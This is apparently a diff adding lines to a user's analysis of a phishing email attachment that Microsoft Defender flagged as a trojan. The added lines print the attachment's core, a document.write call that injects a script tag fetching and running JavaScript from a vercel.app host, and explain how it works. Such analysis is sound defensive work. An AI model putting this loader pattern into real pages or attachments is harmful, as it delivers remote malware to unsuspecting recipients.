@@ -39,3 +39,13 @@ Variable h=(my email address in plain text)
 
 The link to vercel.app loads a script which - according to MS Defender - contains the following trojan: Trojan:Script/Wacatac.B!ml
 
+The entire htm attachment boils down to:
+
+document[write](<script>"https://fictional-dmk.vercel.app/"></script>)
+
+Since 'document[write](xyz)' is the same as 'document.write(xyz)', this will cause the browser to insert the script tag in parentheses into
+the current HTML document, fetch the javascript from fictional-dmk.vercel.app, and execute it. No doubt said javascript code would then
+contain a part that evaluates my email adress by reading the variable 'h' and likely report back to the owner of this thing that I am infected
+and ready to receive a 'pay ransom or your files stay encrypted' mail or similar.
+
+
